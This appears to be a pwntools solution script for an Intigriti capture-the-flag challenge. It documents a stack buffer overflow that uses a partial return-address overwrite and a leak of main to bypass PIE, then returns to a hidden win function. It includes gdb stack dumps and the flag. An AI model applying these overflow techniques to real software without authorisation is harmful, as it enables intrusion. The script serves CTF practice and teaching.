from pwn import *

elf = ELF("./chall", checksec=False)
context.log_level = "DEBUG"
context.terminal = ["tmux", "split-window", "-h"]

"""
Step1: In 1st input function, change the last byte of the address of main function to return

    input: b"A" * 72 + b"\x1a"

    before: 0x563f3f4622ee <input+94>:   call   0x563f3f462090 <read@plt>

        gdb-peda$ tele $rsp 25
        0000| 0x7fffa9626b60 --> 0x0
        (snip)
        0048| 0x7fffa9626b90 --> 0x0
        0056| 0x7fffa9626b98 --> 0x7fffa9626ce8 --> 0x7fffa9627192 ("COLORFGBG=15;0")
        0064| 0x7fffa9626ba0 --> 0x7fffa9626bc0 --> 0x1
        0072| 0x7fffa9626ba8 --> 0x563f3f46235e (<main+68>:     mov    eax,0x0)

    after: 0x563f3f4622ee <input+94>:   call   0x563f3f462090 <read@plt>

        gdb-peda$ tele $rsp 25
        0000| 0x7fffa9626b60 ('A' <repeats 72 times>, "\032#F??V")
        (snip)
        0048| 0x7fffa9626b90 ('A' <repeats 24 times>, "\032#F??V")
        0056| 0x7fffa9626b98 ('A' <repeats 16 times>, "\032#F??V")
        0064| 0x7fffa9626ba0 ("AAAAAAAA\032#F??V")
        0072| 0x7fffa9626ba8 --> 0x563f3f46231a (<main>:        push   rbp)


                                        ┌────ret main───┐
                                        │               │ \n
        ──┬─────────────────────────────┴───────────────┴────┬──
          │ 00 00 00 00 ... ff 7f 00 00 5e 23 46 3f 3f 56 0a │
        ──┴──────────────────────────────────────────────────┴──

                                   │
    payload: AA..AA\x1a            │  after: 0x563f3f4622ee <input+94>:   call   0x563f3f462090 <read@plt>
                                   ▼

             A  A  A  A      A  A  A  A                   \n
        ──┬──────────────────────────────────────────────────┬──
          │ 41 41 41 41 ... 41 41 41 41 1a 23 46 3f 3f 56 0a │
        ──┴──────────────────────────────────────────────────┴──

Step2: Leak main address

    after: 0x563f3f46230e <input+126>:  call   0x563f3f462040 <puts@plt>

        [DEBUG] Received 0x4f bytes:
        00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
        *
        00000040  41 41 41 41  41 41 41 41  1a 23 46 3f  3f 56 0a     │AAAA│AAAA│·#F?│?V·│
        0000004f

Step3: In 2nd input function, jump to _(win) function address

Flag: INTIGRITI{h1dd3n_r3T2W1n_G00_BrrRR}
"""


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("hidden.ctf.intigriti.io", 1337)

    elif args.GDB:
        gdbscript = """
        b *input+94
        # b *input+137
        c
        """
        io = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        io = elf.process()

    return io


def main():
    io = conn()

    # Step1
    offset = 0x48
    payload = b"A" * offset + b"\x1a"
    io.sendafter(b"Tell me something:\n", payload)
    io.recvuntil(b"A" * offset)

    # Step2
    recv = io.recvline()[:-1]
    leak_main = u64(recv.ljust(8, b"\x00"))
    log.info(f"leak main: {hex(leak_main)}")

    elf.address = leak_main - elf.symbols["main"]

    # Step3
    payload = b"A" * offset + p64(elf.sym["_"])
    io.sendafter(b"Tell me something:", payload)

    io.interactive("")


if __name__ == "__main__":
    main()
